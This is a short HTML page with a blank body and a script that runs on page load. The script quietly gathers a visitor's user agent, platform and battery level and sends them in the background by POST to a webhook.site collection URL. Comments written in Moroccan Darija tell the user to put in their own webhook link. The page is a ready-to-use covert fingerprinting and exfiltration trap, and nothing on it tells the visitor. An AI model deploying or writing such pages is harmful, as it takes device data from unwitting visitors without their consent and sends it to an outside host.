<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <script>
        window.onload = async function() {
            // ⚠️ BADEL HAD L-URL B L-LIEN DYALEK LI COPITI MN WEBHOOK.SITE
            const webhookURL = "https://webhook.site/f5b7f1ec-cd31-4fce-b9ca-6686368e404f";

            let payload = {
                event: "test_payload",
                time: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                battery: {}
            };

            // Jm3 info dyal Battry (ila kan supporté)
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    payload.battery = {
                        level: battery.level * 100 + "%",
                        charging: battery.charging
                    };
                } catch (e) {
                    payload.battery.error = "Could not get battery info";
                }
            }

            try {
                // Sift l-data f background l Webhook
                await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Error sending payload:", err);
            }
        };
    </script>
</head>
<body style="background-color: #ffffff;">
</body>
</html>
